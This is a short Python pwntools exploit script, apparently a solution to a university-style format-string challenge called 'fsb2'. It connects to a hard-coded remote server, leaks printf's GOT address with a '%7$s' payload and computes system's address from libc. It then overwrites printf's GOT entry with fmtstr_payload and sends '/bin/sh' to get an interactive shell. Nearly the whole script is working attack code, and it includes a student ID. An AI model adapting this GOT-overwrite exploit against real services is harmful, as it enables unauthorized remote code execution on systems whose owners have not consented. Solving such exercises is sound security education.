from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

libc = ELF("./libc.so")
elf = ELF("./fsb2")
printf_got = elf.got["printf"]
offset = 6

DEBUG = 1
REMOTE = 1

if REMOTE:
    p = remote("8.154.20.109", 10301)
    p.recvuntil(b"Please input your StudentID:\n")
    p.sendline(b"3220103784")

else:
    p = process("./fsb2")

# leak the address of printf
payload = ""
payload += "%7$s"
payload = payload.encode().ljust(8, b'0') # padding
payload += p64(printf_got) # the address of printf

p.sendline(payload)

if REMOTE:
    p.recvuntil(b"Here comes your challenge:\n")

# get system address
printf_addr = u64(p.recv(6).ljust(8, b"\x00"))
system_addr = printf_addr - (libc.symbols["printf"] - libc.symbols["system"])
if DEBUG:
    log.info(f"printf_addr = {hex(printf_addr)}")
    log.info(f"system_addr = {hex(system_addr)}")
payload = fmtstr_payload(offset, {printf_got: system_addr}, write_size="short")
info(f"payload = {payload}")

p.send(payload)
p.send(b"/bin/sh\0")
p.interactive()
